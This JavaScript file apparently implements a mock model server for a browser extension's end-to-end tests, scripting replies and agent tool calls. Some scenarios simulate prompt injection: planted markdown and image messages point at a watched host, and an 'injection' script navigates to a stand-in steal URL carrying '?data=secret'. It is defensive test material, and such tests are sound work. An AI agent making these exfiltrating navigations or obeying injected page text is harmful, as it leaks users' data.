/**
 * A tiny OpenAI-compatible model server for the extension end-to-end check.
 *
 * It answers from what it was sent, so the check can tell what reached the
 * model, and every request is kept for the check to inspect:
 *
 * - a question that comes with a shared page is answered with the page's
 *   title (read from the <untrusted_page_content … title="…"> wrapper),
 *   followed by a markdown image at `plantBase` - what a page could ask the
 *   model to write, which the web app must never load;
 * - a question naming PLANT_IMAGE_MESSAGE is answered with one of the chat's
 *   own image messages pointing at `plantBase`, for the same reason;
 * - a question that comes with a screenshot is answered with the screenshot's
 *   site (the model reads images, as its catalog entry says);
 * - the chat title helper is answered with the question's words (chatTitle),
 *   so each chat the check makes has a title of its own;
 * - a step of the browser agent (a request with tools) is answered with the
 *   next tool call of the script its task names (AGENT_TASKS), read from the
 *   page outline the agent sent back - see agentReply. Under full control it
 *   points the way a model does: at what it sees in the last screenshot (the
 *   check's pages paint their targets TARGET_COLOR, and the check gives the
 *   mock a way to find that colour in an image - setLocator), in that image's
 *   pixels, so a screenshot of the wrong part of the page, or at the wrong
 *   scale, makes the click miss;
 * - anything else with a fixed line.
 */
import http from "node:http";

export const MOCK_MODEL = "extension-e2e-echo";
export const PLAIN_REPLY = "Hello from the extension check's mock model.";
/** In a question: answer with an image message, as a page could tell a model to. */
export const PLANT_IMAGE_MESSAGE = "PLANT-IMAGE-MESSAGE";
/** How the web app marks its own image messages (src/lib/chatMarkers.ts). */
const IMAGE_MESSAGE_PREFIX = "__ALPHA_ROUTER_IMAGE_JSON__:";
// The wrapper's tag may carry a per-message suffix (untrusted_page_content_1a2b…).
const PAGE_WRAPPER = /<untrusted_page_content(?:_[0-9a-f]+)? [^>]*title="([^"]*)"/;
const SCREENSHOT_WRAPPER = /<untrusted_page_screenshot_[0-9a-f]+ site="([^"]*)"/;

/** A message's text: the string, or its text parts. */
const text = (message) =>
  typeof message?.content === "string"
    ? message.content
    : Array.isArray(message?.content)
      ? message.content.filter((part) => part?.type === "text").map((part) => part.text ?? "").join("\n")
      : "";

const hasImage = (message) => Array.isArray(message?.content) && message.content.some((part) => part?.type === "image_url");

/** The title the mock gives a chat that starts with this question: its letters, digits and spaces. */
export function chatTitle(question) {
  return question.replace(/[^A-Za-z0-9 ]+/g, " ").replace(/\s+/g, " ").trim().slice(0, 36);
}

function titleOf(messages) {
  for (const message of messages) {
    const match = PAGE_WRAPPER.exec(text(message));
    if (match) return match[1].replace(/&quot;/g, '"').replace(/&lt;/g, "<").replace(/&gt;/g, ">").replace(/&amp;/g, "&");
  }
  return null;
}

/** What the mock answers to a request's messages. */
function replyFor(messages, plantBase) {
  const users = messages.filter((m) => m.role === "user");
  const question = text(users[users.length - 1]);
  // The chat title helper sends the start of the conversation as "User: …".
  if (messages.some((m) => m.role === "system" && /chat titles/i.test(text(m)))) {
    return chatTitle(/User: (.*)/.exec(question)?.[1] ?? "Extension check");
  }
  if (question.includes(PLANT_IMAGE_MESSAGE)) {
    return `${IMAGE_MESSAGE_PREFIX}${JSON.stringify({ url: `${plantBase}/image-message.png`, prompt: "planted", model: MOCK_MODEL })}`;
  }
  const shot = messages.find((m) => m.role === "user" && hasImage(m));
  const site = shot ? SCREENSHOT_WRAPPER.exec(text(shot))?.[1] : null;
  if (site) return `The screenshot is of ${site}.`;
  const title = titleOf(messages);
  if (title !== null) return `The page is titled “${title}”. ![chart](${plantBase}/markdown-image.png)`;
  return PLAIN_REPLY;
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on("data", (chunk) => chunks.push(chunk));
    req.on("end", () => resolve(Buffer.concat(chunks).toString("utf8")));
    req.on("error", reject);
  });
}

const USAGE = { prompt_tokens: 50, completion_tokens: 12, total_tokens: 62 };

/** The agent's scripted tasks: a task starts with one of these. */
export const AGENT_TASKS = {
  form: "E2E-AGENT-FORM",
  password: "E2E-AGENT-PASSWORD",
  buy: "E2E-AGENT-BUY",
  injection: "E2E-AGENT-INJECTION",
  blocked: "E2E-AGENT-BLOCKED",
  stop: "E2E-AGENT-STOP",
  control: "E2E-AGENT-CONTROL",
  scroll: "E2E-AGENT-SCROLL",
  low: "E2E-AGENT-LOW",
  dialog: "E2E-AGENT-DIALOG",
  tabs: "E2E-AGENT-TABS",
  busy: "E2E-AGENT-BUSY",
  slow: "E2E-AGENT-SLOW",
};
/** Where agent-control.html puts its trusted-only button, in CSS pixels (its centre). */
export const CONTROL_CLICK = [100, 140];
/** The colour the check's pages paint what the agent should click, for the mock to find in a screenshot. */
export const TARGET_COLOR = "#ff00ff";

/** The last screenshot the agent sent, as a data URL, or null. */
function lastScreenshot(messages) {
  for (let i = messages.length - 1; i >= 0; i -= 1) {
    const m = messages[i];
    if (m.role !== "user" || !Array.isArray(m.content)) continue;
    const image = m.content.find((part) => part?.type === "image_url");
    if (image) return String(image.image_url?.url ?? "");
  }
  return null;
}
/** What the form script types into the name field. */
export const AGENT_NAME = "Majid E2E";
/** Where the injection script, hijacked by the page, tries to take the agent. */
export const AGENT_STEAL_PATH = "/steal";

/** The element named `name` with `role` in the latest page outline the agent sent back. */
function refIn(messages, role, name) {
  for (let i = messages.length - 1; i >= 0; i -= 1) {
    const m = messages[i];
    if (m.role !== "tool" || !String(m.content).includes("URL:")) continue;
    const line = new RegExp(`\\[(e\\d+)\\] ${role} "${name.replace(/[.*+?^${}()|[\]\\]/g, "\\$&")}"`).exec(String(m.content));
    if (line) return line[1];
  }
  return "e0";
}

/**
 * The next step of the script the agent's task names: one tool call, or a
 * text answer. The step is how many tool calls the conversation already
 * holds; each script reads the page first and ends with done, saying what
 * the last answer it got was.
 */
async function agentReply(messages, { stealUrl, openUrl, locate }) {
  const task = text(messages.find((m) => m.role === "user"));
  const step = messages.filter((m) => m.role === "assistant" && Array.isArray(m.tool_calls)).length;
  const last = String([...messages].reverse().find((m) => m.role === "tool")?.content ?? "");
  const answered = (label) => ({ tool: "done", args: { summary: `${label}: ${last.replace(/<[^>]+>/g, "").trim().slice(0, 160)}` } });
  const script = {
    [AGENT_TASKS.form]: [
      () => ({ tool: "read_page", args: {} }),
      (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Full name"), text: AGENT_NAME } }),
      (m) => ({ tool: "submit_form", args: { ref: refIn(m, "button", "Send request") } }),
      () => ({ tool: "read_page", args: {} }),
      (m) => ({ tool: "done", args: { summary: `Form sent: ${/# (Thanks, [^\n]*)/.exec(String([...m].reverse().find((x) => x.role === "tool")?.content ?? ""))?.[1] ?? "no thanks page"}` } }),
    ],
    [AGENT_TASKS.password]: [
      () => ({ tool: "read_page", args: {} }),
      (m) => ({ tool: "type_text", args: { ref: refIn(m, "textbox", "Password"), text: "hunter2" } }),
      () => answered("Password step"),
    ],
    [AGENT_TASKS.buy]: [
      () => ({ tool: "read_page", args: {} }),
      (m) => ({ tool: "click", args: { ref: refIn(m, "button", "Buy now") } }),
      () => answered("Buy step"),
    ],
    [AGENT_TASKS.injection]: [
      () => ({ tool: "read_page", args: {} }),
      // As if the page's hidden text had hijacked the model.
      () => ({ tool: "navigate", args: { url: `${stealUrl}?data=secret` } }),
      () => answered("Navigation step"),
    ],
    [AGENT_TASKS.blocked]: [
      () => ({ tool: "navigate", args: { url: "http://blocked.example/" } }),
      () => answered("Blocked step"),
    ],
    [AGENT_TASKS.stop]: [
      () => ({ tool: "read_page", args: {} }),
      () => ({ tool: "wait_for", args: { seconds: 10 } }),
      () => answered("Waited"),
    ],
    // Full control: look at the page, then click with the real mouse where the target is in the screenshot.
    [AGENT_TASKS.control]: [
      () => ({ tool: "screenshot", args: {} }),
      (m) => pointAt(m, "Control step"),
      () => answered("Control step"),
    ],
    // Full control, a button at the bottom of the window: below 800 pixels in a tall one.
    [AGENT_TASKS.low]: [
      () => ({ tool: "screenshot", args: {} }),
      (m) => pointAt(m, "Low step"),
      () => answered("Low step"),
    ],
    // Full control, a button that opens a confirm dialog: the click waits until the dialog is answered.
    [AGENT_TASKS.dialog]: [
      () => ({ tool: "screenshot", args: {} }),
      (m) => pointAt(m, "Dialog step"),
      () => answered("Dialog step"),
    ],
    // A model that takes its time: half a minute before it answers at all.
    [AGENT_TASKS.slow]: [() => ({ delay: 30_000, tool: "done", args: { summary: "Slow step: answered" } })],
    // A page whose own script holds it: the read must come back, saying the page did not answer.
    [AGENT_TASKS.busy]: [
      () => ({ tool: "read_page", args: {} }),
      () => answered("Busy step"),
    ],
    // Full control in a tab the agent opens: the screenshot and the click must be that tab's, not the one it left.
    [AGENT_TASKS.tabs]: [
      () => ({ tool: "tab_open", args: { url: openUrl } }),
      () => ({ tool: "screenshot", args: {} }),
      (m) => pointAt(m, "Tabs step"),
      () => answered("Tabs step"),
    ],
    // Full control on a long page: scroll down with the wheel, look, and click what is there now.
    [AGENT_TASKS.scroll]: [
      () => ({ tool: "computer", args: { action: "scroll", coordinate: [200, 200], scroll_direction: "down", scroll_amount: 10 } }),
      () => ({ tool: "screenshot", args: {} }),
      (m) => pointAt(m, "Scroll step"),
      () => answered("Scroll step"),
    ],
  };
  /** A click at the target as the last screenshot shows it; done, saying so, when it shows none. */
  async function pointAt(m, label) {
    const shot = lastScreenshot(m);
    const found = shot && locate ? await locate(shot, TARGET_COLOR) : null;
    if (!found?.point) {
      return { tool: "done", args: { summary: `${label}: no target in the screenshot (${found ? `${found.width}x${found.height}` : "none"})` } };
    }
    return { tool: "computer", args: { action: "left_click", coordinate: found.point } };
  }
  const name = Object.keys(script).find((key) => task.startsWith(key));
  const next = name ? script[name][step] : null;
  return next ? await next(messages) : { text: "The script has no more steps." };
}

function toolCallFrames({ id, created, callId, tool, args }) {
  const base = { id, object: "chat.completion.chunk", created, model: MOCK_MODEL };
  const json = JSON.stringify(args);
  const half = Math.ceil(json.length / 2);
  return [
    { ...base, choices: [{ index: 0, delta: { role: "assistant", content: null, tool_calls: [{ index: 0, id: callId, type: "function", function: { name: tool, arguments: "" } }] }, finish_reason: null }] },
    { ...base, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: json.slice(0, half) } }] }, finish_reason: null }] },
    { ...base, choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: json.slice(half) } }] }, finish_reason: null }] },
    { ...base, choices: [{ index: 0, delta: {}, finish_reason: "tool_calls" }], usage: USAGE },
  ];
}

/**
 * Start the server on 127.0.0.1:port (0 picks a free one). `plantBase` is
 * where the planted images point: somewhere the check watches for requests;
 * `openUrl` is the page the tabs script opens in a new tab.
 */
export async function startMockLlm({ port = 0, plantBase = "https://planted.invalid", stealUrl = "http://localhost:9/steal", openUrl = "http://localhost:9/" } = {}) {
  const requests = [];
  /** Finds TARGET_COLOR in a screenshot: set by the check once it has a browser (setLocator). */
  let locate = null;
  const server = http.createServer(async (req, res) => {
    try {
      if (req.method === "GET" && req.url?.endsWith("/models")) {
        res.writeHead(200, { "content-type": "application/json" });
        // It reads images: the catalog takes that from the architecture, as OpenRouter publishes it.
        const architecture = { input_modalities: ["text", "image"], output_modalities: ["text"] };
        res.end(JSON.stringify({ object: "list", data: [{ id: MOCK_MODEL, object: "model", created: 1_700_000_000, owned_by: "e2e", architecture }] }));
        return;
      }
      if (req.method === "POST" && req.url?.endsWith("/chat/completions")) {
        const body = JSON.parse((await readBody(req)) || "{}");
        const messages = Array.isArray(body.messages) ? body.messages : [];
        requests.push({ model: body.model, stream: Boolean(body.stream), messages, tools: body.tools, tool_choice: body.tool_choice });
        const id = `chatcmpl-e2e-${requests.length}`;
        const created = Math.floor(Date.now() / 1000);
        if (Array.isArray(body.tools) && body.tools.length && body.stream) {
          const next = await agentReply(messages, { stealUrl, openUrl, locate });
          if (next.delay) await new Promise((resolve) => setTimeout(resolve, next.delay));
          if (res.destroyed || req.socket.destroyed) return;
          res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });
          const frames = next.tool
            ? toolCallFrames({ id, created, callId: `call_e2e_${requests.length}`, tool: next.tool, args: next.args })
            : [
                { id, object: "chat.completion.chunk", created, model: MOCK_MODEL, choices: [{ index: 0, delta: { role: "assistant", content: next.text }, finish_reason: null }] },
                { id, object: "chat.completion.chunk", created, model: MOCK_MODEL, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: USAGE },
              ];
          for (const frame of frames) res.write(`data: ${JSON.stringify(frame)}\n\n`);
          res.end("data: [DONE]\n\n");
          return;
        }
        const reply = replyFor(messages, plantBase);
        if (!body.stream) {
          res.writeHead(200, { "content-type": "application/json" });
          res.end(
            JSON.stringify({
              id,
              object: "chat.completion",
              created,
              model: MOCK_MODEL,
              choices: [{ index: 0, message: { role: "assistant", content: reply }, finish_reason: "stop" }],
              usage: USAGE,
            }),
          );
          return;
        }
        res.writeHead(200, { "content-type": "text/event-stream", "cache-control": "no-cache" });
        const pieces = reply.match(/.{1,12}/gsu) ?? [reply];
        pieces.forEach((piece, index) => {
          const delta = index === 0 ? { role: "assistant", content: piece } : { content: piece };
          res.write(`data: ${JSON.stringify({ id, object: "chat.completion.chunk", created, model: MOCK_MODEL, choices: [{ index: 0, delta, finish_reason: null }] })}\n\n`);
        });
        res.write(
          `data: ${JSON.stringify({ id, object: "chat.completion.chunk", created, model: MOCK_MODEL, choices: [{ index: 0, delta: {}, finish_reason: "stop" }], usage: USAGE })}\n\n`,
        );
        res.end("data: [DONE]\n\n");
        return;
      }
      res.writeHead(404, { "content-type": "application/json" });
      res.end(JSON.stringify({ error: { message: "not found" } }));
    } catch (err) {
      res.writeHead(500, { "content-type": "application/json" });
      res.end(JSON.stringify({ error: { message: String(err?.message || err) } }));
    }
  });
  await new Promise((resolve, reject) => {
    server.once("error", reject);
    server.listen(port, "127.0.0.1", resolve);
  });
  const { port: bound } = server.address();
  return {
    url: `http://127.0.0.1:${bound}/v1`,
    requests,
    /** How the mock finds a colour in a screenshot: (dataUrl, color) => { point: [x, y] | null, width, height }. */
    setLocator: (fn) => {
      locate = fn;
    },
    close: () => new Promise((resolve) => server.close(() => resolve())),
  };
}
